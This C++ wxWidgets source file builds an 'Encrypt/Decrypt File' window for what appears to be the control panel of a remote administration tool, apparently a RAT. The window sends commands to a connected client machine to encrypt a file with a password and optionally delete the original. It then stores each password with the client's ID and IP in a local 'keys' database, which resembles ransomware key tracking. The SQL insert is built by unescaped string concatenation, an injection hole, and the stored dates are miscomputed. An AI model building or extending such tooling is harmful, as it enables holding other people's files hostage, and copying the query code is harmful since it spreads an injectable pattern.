#include "file_encryption.hpp"
#include "panel_file_manager.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(frameEncryption, wxFrame)
	EVT_BUTTON(EnumIDS::ID_FM_BTN_Random, frameEncryption::OnGenerarPass)
	EVT_BUTTON(EnumIDS::ID_FM_BTN_Crypt_Exec, frameEncryption::OnExecCrypt)
wxEND_EVENT_TABLE()

frameEncryption::frameEncryption(wxWindow* pParent, std::string _strPath, std::string _strID, std::string _strIP, SOCKET _sck, ByteArray c_key) :
	wxFrame(pParent, wxID_ANY, "Encriptar/Desencriptar Archivo", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE) {
	this->p_strPath = _strPath;
	this->strID = _strID;
	this->strIP = _strIP;
	this->sckCliente = _sck;
	this->enc_key = c_key;

	this->radioEncrypt = new wxRadioButton(this, EnumIDS::ID_FM_Radio_Encriptar, "Encriptar", wxDefaultPosition, wxDefaultSize, wxRB_GROUP);
	
	this->radioDecrypt = new wxRadioButton(this, EnumIDS::ID_FM_Radio_Desencriptar, "Desencriptar");
	
	wxBoxSizer* sizerops = new wxBoxSizer(wxHORIZONTAL);
	sizerops->Add(this->radioEncrypt, 0, wxALL, 5);
	sizerops->Add(this->radioDecrypt, 0, wxALL, 5);

	
	wxStaticText* lbl_File = new wxStaticText(this, wxID_ANY, "Archivo: " + this->p_strPath);
	wxStaticText* lbl_Pass = new wxStaticText(this, wxID_ANY, "Contraseña (longitud por defecto de 40)");
	wxButton* btn_Random_Pass = new wxButton(this, EnumIDS::ID_FM_BTN_Random, "Generar contraseña");
	wxButton* btn_Exec = new wxButton(this, EnumIDS::ID_FM_BTN_Crypt_Exec, "Ejecutar");
	this->chk_del = new wxCheckBox(this, EnumIDS::ID_FM_Del_Check_Crypt, "Eliminar una vez sea cifrado/descifrado");

	this->txt_Pass = new wxTextCtrl(this, EnumIDS::ID_FM_Text_Password);

	wxBoxSizer* sizerRandomPass = new wxBoxSizer(wxHORIZONTAL);
	sizerRandomPass->Add(this->txt_Pass, 1, wxALL, 1);
	sizerRandomPass->Add(btn_Random_Pass, 0);

	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
	
	sizer->Add(lbl_File, 0, wxEXPAND, 1);
	sizer->Add(sizerops, 0, wxALL, 1);
	sizer->AddSpacer(10);
	sizer->Add(this->chk_del, 0, wxEXPAND, 1);
	sizer->AddSpacer(10);
	sizer->Add(lbl_Pass, 0, wxEXPAND, 1);
	sizer->Add(sizerRandomPass, 1, wxALL | wxEXPAND, 1);
	sizer->Add(btn_Exec, 0, wxEXPAND, 1);

	this->SetSizerAndFit(sizer);

	//this->SetClientSize(400, 150);

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void frameEncryption::Exec_SQL(const char* cCMD) {
	sqlite3* db;
	char* zErrMsg = 0;

	if (sqlite3_open(DB_FILE, &db) != SQLITE_OK) {
		DEBUG_MSG("[DBCRYPT] No se pudo abrir la bd");
		DEBUG_MSG(sqlite3_errmsg(db));
		wxMessageBox("No se pudo abrir la base de datos");
		goto dbRelease;
	}

	if (sqlite3_exec(db, cCMD, NULL, 0, &zErrMsg) != SQLITE_OK) {
		wxMessageBox("Error: " + std::string(zErrMsg));
		goto dbRelease;
	}

dbRelease:

	sqlite3_free(zErrMsg);
	sqlite3_close(db);
}

void frameEncryption::OnGenerarPass(wxCommandEvent& event) {
	this->txt_Pass->SetValue(RandomPass(40));
}

void frameEncryption::OnExecCrypt(wxCommandEvent& event) {
	std::string strComando = this->radioEncrypt->GetValue() ? "0" : "1";
	strComando += this->chk_del->IsChecked() ? "1" : "0";
	strComando.append(1, CMD_DEL);
	strComando += this->p_strPath;
	strComando.append(1, CMD_DEL);
	strComando += this->txt_Pass->GetValue();

	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::FM_Crypt_Archivo, this->enc_key);

	//Agregar a BD si es para cifrar
	if (this->radioEncrypt->GetValue()) {
		time_t temp = time(0);
		struct tm* timeptr = localtime(&temp);

		std::string strFecha = std::to_string(timeptr->tm_mday);
		strFecha += "/" + std::to_string(timeptr->tm_mon);
		strFecha += "/" + std::to_string(timeptr->tm_year);
		std::string strCMD = "INSERT INTO keys (id, ip, nombre, fecha, pass) VALUES('";
		strCMD += this->strID + "', '";
		strCMD += this->strIP + "', '";
		strCMD += this->p_strPath + "', '";
		strCMD += strFecha + "', '";
		strCMD += this->txt_Pass->GetValue() + "');";

		this->Exec_SQL(strCMD.c_str());
	}
}